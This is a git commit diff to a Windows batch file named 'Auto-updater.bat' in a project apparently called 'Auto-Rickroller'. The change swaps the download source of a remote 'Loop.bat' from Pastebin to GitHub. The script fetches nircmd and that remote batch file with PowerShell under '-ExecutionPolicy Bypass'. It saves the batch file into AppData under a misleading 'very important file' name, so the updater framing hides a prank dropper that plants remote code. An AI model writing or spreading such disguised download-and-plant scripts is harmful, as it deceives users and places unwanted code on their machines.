af9e37b7b010de95f388a97c0b9bec5127182c50
patr824a <patr824a@gmail.com>
2025-03-14 12:38:44 +0100

    Update Auto-updater.bat
    Changed the download link from the old Pastebin link to the new GitHub repository link for the Loop.bat file.

--- Chrome/Auto-updater.bat
+++ Chrome/Auto-updater.bat
@@ -5,7 +5,7 @@ set "nircmd_zip=%USERPROFILE%\Downloads\nircmd.zip"
 set "nircmd_extract=%USERPROFILE%\Downloads\nircmd"
 set "nircmd_exe=%nircmd_extract%\nircmd.exe"
 set "nircmd_path=%USERPROFILE%\AppData\Local"
-set "bat_url=https://pastebin.com/raw/pqHM6eKp"
+set "bat_url=https://raw.githubusercontent.com/patr824a/Auto-Rickroller/refs/heads/main/Chrome/Loop.bat"
 set "bat_path=%USERPROFILE%\AppData\Local\MegetVigtigFilAD.bat"
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('%nircmd_url%', '%nircmd_zip%')"
